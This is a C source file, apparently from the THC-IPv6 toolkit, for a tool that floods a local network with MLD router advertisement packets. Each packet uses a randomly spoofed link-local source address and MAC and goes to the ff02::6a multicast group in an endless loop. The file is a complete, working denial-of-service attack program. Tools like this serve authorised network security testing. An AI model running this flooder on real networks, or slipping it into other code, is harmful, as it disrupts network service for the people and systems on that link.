#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s interface\n\n", prg);
  printf("Flood the local network with MLD router advertisements.\n");
//  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *interface, mac[6] = "";
  unsigned char *mac6 = mac, *ip6 = thc_resolve6("fe80::ff:fe00:0");
  unsigned char buf[6];
  unsigned char *dst = thc_resolve6("ff02:0:0:0:0:0:0:6a"), *dstmac = thc_get_multicast_mac(dst);
  int i;
  unsigned char *pkt = NULL;
  int pkt_len = 0;
  int rawmode = 0;
  int count = 0;

  if (argc < 2 || argc > 3 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[1];

  memset(buf, 0, sizeof(buf));
  mac[0] = 0x00;
  mac[1] = 0x18;
  ip6[9] = mac[1];

  printf("Starting to flood network with MLD router advertisements on %s (Press Control-C to end, a dot is printed for every 100 packet):\n", interface);
  while (1) {

    for (i = 0; i < 4; i++)
      mac[2 + i] = rand() % 256;

//    ip6[9] = mac[1];
    ip6[10] = mac[2];
    ip6[13] = mac[3];
    ip6[14] = mac[4];
    ip6[15] = mac[5];
    count++;

    if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, ip6, dst, 1, 0, 0, 0, 0)) == NULL)
      return -1;
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_MLD_ROUTERADV, 15, 0x00300006, buf, 0, 0) < 0)
      return -1;
    if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) {
//      fprintf(stderr, "Error sending packet no. %d on interface %s: ", count, interface);
//      perror("");
//      return -1;
      printf("!");
    }

    pkt = thc_destroy_packet(pkt);
//    usleep(1);
    if (count % 100 == 0)
      printf(".");
  }
  return 0;
}
